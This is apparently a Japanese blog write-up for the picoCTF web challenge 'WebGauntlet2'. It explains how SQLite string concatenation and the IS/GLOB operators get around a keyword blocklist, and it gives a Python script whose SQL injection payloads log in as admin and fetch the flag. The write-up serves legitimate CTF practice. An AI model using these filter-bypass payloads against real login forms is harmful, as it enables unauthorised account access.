---
title: 'WebGauntlet2 - picoCTF'
description: 'Web Gauntlet2のWriteupです。'
pubDate: 2025-12-27
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'SQLi', 'SQLite']
---

# WebGauntlet2 - picoCTF

## 初期調査

SQLinjectionを行なってAdminでログインする。

まずはfilter.phpを確認
```
or and true false union like = > < ; -- /* */ admin
```

フィルターを考慮してSQLiを実行するとエラーを吐いてくれる。
```
<b>Warning</b>:  SQLite3::query():
```

## SQLiteの特徴

### 文字連結

```
'te' || 'st' || = 'test'
```
というように文字連結できる。\
この機能を考慮して、adminという文字を作成する。

### 比較演算子

- IS
- GLOB
- LIKE .etc

SQLite には boolean 型が存在しないため、比較演算子の結果は 0(False) / 1(True) の数値として評価される。\
今回の場合だと`Username`は`admin`にし、`Password`はコメントアウトが制限されているので、正しいものかTrueを返す必要がある。比較演算子を使用してパスワードチェックを回避する。

## Exploit

```py
import requests
from urllib.parse import *
import re

URL = "http://challenge-host"

s = requests.Session()

endpoint = "/index.php"
data = {
  "user": "'||'ad'||'min'||'",
  "pass": "'IS NOT 0 ||'" # 'GLOB '*'||'これでもよい
}
req = s.post(urljoin(URL, endpoint), data=data)

endpoint = "/filter.php"
req = s.get(urljoin(URL, endpoint))

flag = re.search(r"picoCTF\{[^}]+\}", req.text).group(0)
print(flag)
```

実行:

```bash
$ python3 exploit.py
picoCTF{***}
```